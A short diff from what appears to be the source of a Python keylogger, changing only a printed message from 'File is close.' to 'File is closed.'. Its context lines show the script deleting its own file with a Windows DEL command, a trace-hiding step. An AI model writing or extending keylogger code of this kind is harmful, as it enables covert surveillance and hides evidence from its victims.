@@ -103,7 +103,7 @@ class KeyLogger:
                 print('File was closed.')
                 os.system("DEL " + os.path.basename(__file__))
             except OSError:
-                print('File is close.')
+                print('File is closed.')
 
         else:
             try:
